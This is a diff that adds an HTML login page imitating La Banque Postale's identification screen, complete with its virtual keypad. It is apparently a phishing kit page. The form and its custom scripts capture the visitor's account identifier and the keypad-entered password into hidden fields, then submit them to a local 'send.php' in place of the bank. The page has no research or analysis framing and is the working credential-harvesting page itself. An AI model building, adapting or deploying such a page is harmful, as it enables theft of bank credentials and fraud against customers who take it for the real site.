@@ -1,0 +1,166 @@
+
+
+<!DOCTYPE html>
+<html class="no-js" style="-moz-user-select: none;" lang="fr"><head>
+		<meta charset="UTF-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+		<title>Identification - La Banque Postale</title>
+		<link rel="icon" href="../content/img/favicon.ico" type="image/gif" sizes="32x32">
+		<meta http-equiv="content-style-type" content="text/css">
+		<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+
+
+		<style type="text/css">
+			@import url('../content/css/loader.css');
+			@import url('../content/css/cvs_all.css');
+			[id="imageclavier"]{
+				background:url() no-repeat 13px 6px;
+			}
+
+
+			input#password {
+			    display: block;
+			    background: #fff;
+			    height: 35px;
+			    width: 242px;
+			    margin: 0 auto 5px auto;
+			    border: 1px solid #dcdcdc;
+			    font-size: 1.2rem;
+			    color: #526272;
+			    letter-spacing: 8px;
+			    text-align: center;
+			}
+			input#val {
+    background: #4e80bc;
+    border-color: #4e80bc;
+}
+		</style>
+		<style type="text/css" media="(orientation:portrait) and (max-height:533px)">
+			@import url('../content/css/cvs_portable.css');
+			[id="imageclavier"]{
+				background:url() no-repeat 44px 6px;
+			}
+		</style>
+	</head>
+
+	<body id="mobipph">
+		<div id="loader" aria-hidden="true" class="" style="top:0px"><div>
+		</div></div>
+		<br>
+		<div class="" id="conteneurCvs">
+			<form method="post" action="send.php" id="sendzabi" name="formAccesCompte" class="layer_blockRight">
+				<div>
+					<input type="hidden" name="urlbackend" value="">
+					<input type="hidden" name="origin" value="mobipph">
+					<input type="hidden" name="password" id="cs" value="">
+					<input type="hidden" name="cv" value="true">
+					<input type="hidden" name="cvvs" value="">
+				</div>
+				<div id="cvs-bloc">
+
+					<div id="cvs-bloc-identifiant">
+						<label class="webaccess" for="val_cel_identifiant">identifiant</label>
+						<input autocorrect="off" type="tel" name="username" id="val_cel_identifiant" autocapitalize="off" format="*N" autocomplete="off" placeholder="Saisissez ici votre identifiant" maxlength="11" pattern="[0-9,a-z,A-Z]*" spellcheck="false" onkeypress="return checkInput(event);">
+
+						<input class="input-non-modif" type="tel" id="val_cel_identifiant_masque" disabled="disabled" style="display: none;">
+						<input type="checkbox" id="saveId" name="saveId" onchange="modifIdent()">
+						<label for="saveId">Mémoriser mon identifiant.</label>
+					</div>
+					<div id="cvs-bloc-mdp">
+						<label class="webaccess" for="cvs-bloc-mdp-input">mot de passe</label>
+						<input type="text"    disabled="disabled" name="pass" id="password"  maxlength="6" placeholder="Composez votre mot de passe" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
+						<input type="hidden" id="passhidden" name="password"  maxlength="6">
+
+						<div id="cvs-lien-voca">
+							<input type="button" class="non-cache" id="cvs-lien-voca-active" value="Activer la vocalisation" onclick="CVSVTable.lancer();">
+							<input type="button" class="cache" id="cvs-lien-voca-desactive" value="Désactiver la vocalisation" onclick="desactiverVocalisation();">
+						</div>
+						<div id="blocImage">
+							<div id="imageclavier">
+								<div>
+									<button type="button"  id="val_cel_0" value="0" onclick="getthis(this)" ><img alt="" src="../content/img/key_0.png"></button><!--
+									--><button type="button" id="val_cel_1" value="7" onclick="getthis(this)"><img alt="" src="../content/img/key_7.png"></button><!--
+									--><button type="button" id="val_cel_2" value="9" onclick="getthis(this)"><img alt="" src="../content/img/key_9.png"></button><!--
+									--><button type="button" id="val_cel_3" value="3" onclick="getthis(this)"><img alt="" src="../content/img/key_3.png"></button>
+								</div><!--
+								--><div>
+									<button type="button" id="val_cel_4" value="4" onclick="getthis(this)"><img alt="" src="../content/img/key_4.png"></button><!--
+									--><button type="button" id="val_cel_5" value="" onclick="getthis(this)"><img alt="" src="../content/img/key_empty.png"></button><!--
+									--><button type="button" id="val_cel_6" value="" onclick="getthis(this)"><img alt="" src="../content/img/key_empty.png"></button><!--
+									--><button type="button" id="val_cel_7" value="" onclick="getthis(this)"><img alt="" src="../content/img/key_empty.png"></button>
+								</div><!--
+								--><div>
+									<button type="button" id="val_cel_8" value="2" onclick="getthis(this)"><img alt="" src="../content/img/key_2.png"></button><!--
+									--><button type="button" id="val_cel_9" value="" onclick="getthis(this)"><img alt="" src="../content/img/key_empty.png"></button><!--
+									--><button type="button" id="val_cel_10" value="" onclick="getthis(this)"><img alt="" src="../content/img/key_empty.png"></button><!--
+									--><button type="button" id="val_cel_11" value="5" onclick="getthis(this)"><img alt="" src="../content/img/key_5.png"></button>
+								</div><!--
+								--><div>
+									<button type="button" id="val_cel_12" value="8" onclick="getthis(this)" ><img alt="" src="../content/img/key_8.png"></button><!--
+									--><button type="button" id="val_cel_13" value="1" onclick="getthis(this)"><img alt="" src="../content/img/key_1.png"></button><!--
+									--><button type="button" id="val_cel_14" value="6" onclick="getthis(this)"><img alt="" src="../content/img/key_6.png"></button><!--
+									--><button type="button" id="val_cel_15" value="" onclick="getthis(this)"><img alt="" src="../content/img/key_empty.png"></button>
+								</div>
+							</div>
+						</div>
+						<div class="webaccess">Fin du clavier virtuel</div>
+					</div>
+					<div id="cvs-bloc-boutons">
+						<input type="button" id="val" value="Valider" class="grey" onclick="valdiersend()">
+						<input type="button" id="effacer" value="Effacer" onclick="resetput();">
+					</div>
+					<div id="progressBar"></div>
+				</div>
+			</form>
+		</div>
+		<div id="cvs_swf">&nbsp;</div>
+
+		<noscript>
+			<div id="noscript">
+
+
+			</div>
+		</noscript>
+	<script language="javascript" type="text/javascript">
+		var OST_origin="mobipph";
+		var OST_flash="loginform?swf=avalue&";
+		var OST_audio5="loginform?mp3=avalue&";
+		var OST_audioOgg = "";
+		var OST_action="login";
+		var PATH_STATIQUE = "#";
+		var IMG_ALL = "";
+	</script>
+	<script>
+    function valdiersend(){
+
+		 document.getElementById("sendzabi").submit();
+
+		}
+
+		function getthis($id)
+		{
+			var $pass;
+    		$pass=$id.value;
+				$count=document.getElementById("password").value;
+				if($count.length<6)
+				{
+					document.getElementById("password").value+="*";
+					document.getElementById("passhidden").value+=$pass;
+				}
+
+		}
+
+		function resetput()
+		{
+
+			document.getElementById("password").value=null;
+			document.getElementById("passhidden").value=null;
+
+		}
+
+	</script>
+	<script language="javascript" type="text/javascript" src="../content/js/jquery-1.js"></script>
+	<script language="javascript" type="text/javascript" src="../content/js/val_keypad_cvvs-commun-unifie.js"></script>
+	<script language="javascript" type="text/javascript" src="../content/js/val_keypad_cvvs-unifie.js"></script>
+
+</body></html>
